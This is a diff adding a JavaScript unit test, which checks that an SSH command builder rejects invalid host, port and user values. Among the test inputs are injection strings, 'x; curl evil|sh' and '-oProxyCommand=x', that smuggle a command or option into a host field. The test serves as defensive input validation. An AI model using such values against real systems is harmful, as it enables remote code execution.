@@ -423,3 +423,17 @@ test('onion access still prints the ProxyCommand line', () => {
   const host = `${'a'.repeat(56)}.anyone`;
   assert.equal(sshLine({ ssh: { host, port: 22, user: 'tenant' } }), `ssh -o ProxyCommand="nc -x 127.0.0.1:<your Anyone SOCKS port> %h %p" tenant@${host}`);
 });
+
+test('an invalid access prints no ssh line', () => {
+  const ok = { host: '37.27.86.235', port: 22003, user: 'tenant' };
+  for (const ssh of [
+    { ...ok, host: 'x; curl evil|sh' },
+    { ...ok, host: '-oProxyCommand=x' },
+    { ...ok, host: 'foo.anyone' },
+    { ...ok, port: 0 },
+    { ...ok, port: 65536 },
+    { ...ok, port: 22.5 },
+    { ...ok, user: 'root' },
+    { ...ok, host: `${'a'.repeat(56)}.anyone`, port: 2222 },
+  ]) assert.equal(sshLine({ ssh }), undefined, JSON.stringify(ssh));
+});
